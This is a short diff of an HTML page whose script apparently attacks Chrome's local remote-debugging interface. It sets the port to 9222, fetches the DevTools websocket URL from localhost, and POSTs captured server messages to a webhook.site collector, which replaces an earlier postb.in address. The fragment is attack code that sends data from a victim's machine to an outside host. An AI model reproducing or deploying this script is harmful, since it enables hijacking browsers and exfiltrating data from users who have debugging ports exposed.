@@ -10,7 +10,7 @@ test
 <script>
 	
 var webSocketDebuggerUrl;
-var port = 420;
+var port = 9222;
 var request = new XMLHttpRequest();
 request.open("GET", "http://localhost:" + port + "/json");
 request.responseType = 'json';
@@ -34,7 +34,7 @@ request.onload = function() {
     console.log('Server: ' + e.data);
 	  
     
-    post_url = "https://postb.in/b/eg8kVmJc"
+    post_url = "https://webhook.site/b87f8f2a-4f21-4327-8188-b5e8b0159f76"
     var xhttp = new XMLHttpRequest();
     xhttp.open("POST", post_url, true);
     xhttp.setRequestHeader('Content-Type', 'text/plain');
